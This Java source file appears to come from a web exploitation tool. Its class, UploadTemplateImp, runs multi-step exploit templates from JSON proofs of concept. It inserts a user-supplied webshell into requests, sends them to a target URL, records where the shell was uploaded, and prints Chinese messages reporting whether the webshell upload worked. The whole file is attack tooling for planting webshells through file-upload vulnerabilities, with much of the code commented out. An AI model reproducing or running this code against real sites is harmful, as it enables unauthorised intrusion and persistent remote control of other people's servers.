package com.bcvgh.core.exp;

import com.alibaba.fastjson.JSONObject;
import com.bcvgh.utils.HttpTools;
import com.bcvgh.utils.Response;

import java.util.HashMap;
import java.util.Map;
import java.util.TreeMap;

public class UploadTemplateImp extends ExpTemplateImp{
    private String webshell;

    public UploadTemplateImp(String url, JSONObject poc, HashMap<String, String> Extra) {
        super(url, poc);
        this.webshell = Extra.get("webshell");
        this.Exp = this.replacePlaceholder(this.Exp, "{webshell}", this.webshell);
//        this.Exp = this.replacePlaceholder(this.Exp, "{webshell:Base64Encode:1}", Encode.Base64Encode(this.webshell));
        this.Exp = this.PlaceholderHandling(this.Exp,this.webshell);
//        if (ExpPost.contains("{webshell}")) ExpPost = ExpPost.replace("{webshell}",this.webshell);
        /**newnewnew需要优化**/
//        if (ExpPost.contains("{webshell:base64}")) ExpPost = ExpPost.replace("{webshell:base64}", Encode.Base64Encode(this.webshell));
//        this.filename = Extra.get("filename");
    }

//    @Override
//    public TreeMap<String, String> exploitVul() {
//        TreeMap<String,Object> mapPoc = new TreeMap<>(this.Exp.getInnerMap());
//    }


    @Override
    public HashMap<String, String> exploitVul() {
        Integer i = 1;
        String value;
        this.result.put("name",this.name);
        for (Integer n = 1; n <= this.Exp.keySet().size(); n++) {
            value = "step" + Integer.toString(n);
            this.initStep(value);
//            JSONObject stepContent = this.Exp.getJSONObject(value);
//            this.ExpPost = stepContent.getString("expPost");
//            this.ExpGet = stepContent.getString("expGet");
//            this.pattern = stepContent.getString("Pattern");
////            ExpPost = stepContent.getString("expPost");
////            ExpGet = stepContent.getString("expGet");
////            Pattern = stepContent.getString("Pattern");
//            this.header = new HashMap<>(stepContent.getJSONObject("header"));
//            for (String key : this.header.keySet()) {
//                if (((String) this.header.get(key)).contains("{url}")){
//                    this.header.replace(key, PocUtil.url);
//                }
//            }
//            for (String key : this.header.keySet()) {
//                String a = (String) this.header.get(key);
//                if (a.contains("{0}")) {
//                    a.replace("{0}",this.webshell);
//                    break;
//                }
//            }
            try {
                if (ExpGet.contains("{shellPath}")) ExpGet = ExpGet.replace("{shellPath}",this.result.get("shellPath"));
            }catch (Exception e){
                this.result.put("prompt","利用失败，请检查poc可用性");
                return this.result;
            }
            if (ExpPost !=null){
//                if (ExpPost.contains("{webshell}")) ExpPost = ExpPost.replace("{webshell}",this.webshell);
//                /**newnewnew需要优化**/
//                if (ExpPost.contains("{webshell:base64}")) ExpPost = ExpPost.replace("{webshell:base64}", Encode.Base64Encode(this.webshell));
                /****/
                Response res = HttpTools.post(this.Url.concat(ExpGet),ExpPost,this.header,"UTF-8");
                if (this.ExpRequest(res,"upload")){
                    return this.result;
                }
//                if (res.getText()==null || res.getCode()==302 || res.getCode()==404){
//                    this.isExploited = false;
////                    this.result.put("prompt","error");
//                    this.result.put("prompt","[-] 漏洞利用失败，请检查Poc可用性");
//                    return this.result;
//                }
//                String resText = this.resMatch(res.getText(),this.pattern);
//                if (resText.equals("error")){
//                    this.isExploited = false;
//                }
//                if (!resText.equals("error")){
//                    this.isExploited = true;
//                    this.result.put("res",resText);
//                    if (!this.resMatch(resText,"(.*\\.[a-zA-Z]{1,4})").equals(null)){
//                        this.result.put("shellPath",resText);
//                    };
//                }
            }
            else if (ExpGet !=null){
                Response res = HttpTools.get(this.Url.concat(ExpGet),this.header,"UTF-8");
                if (this.ExpRequest(res,"upload")){
                    return this.result;
                }
//                if (res.getText()==null || res.getCode()==302 || res.getCode()==404){
//                    this.isExploited = false;
////                    this.result.put("prompt","error");
//                    this.result.put("prompt","[-] 漏洞利用失败，请检查Poc可用性");
//                    return this.result;
//                }
//                String resText = this.resMatch(res.getText(),this.pattern);
//                if (resText.equals("error")){
//                    this.isExploited = false;
//                }
//                if (!resText.equals("error")){
//                    this.isExploited = true;
//                    this.result.put("res",resText);
//                }
            }
            i = i+1;
        }
        if (this.isExploited){
            this.result.put("result","[+] 文件上传成功,请自行检查webshell可用性！\n"+this.Url+ExpGet);
        }
        else {
            this.result.put("prompt","[-] 漏洞利用失败，请检查Poc可用性");
        }
        return this.result;
    }
}
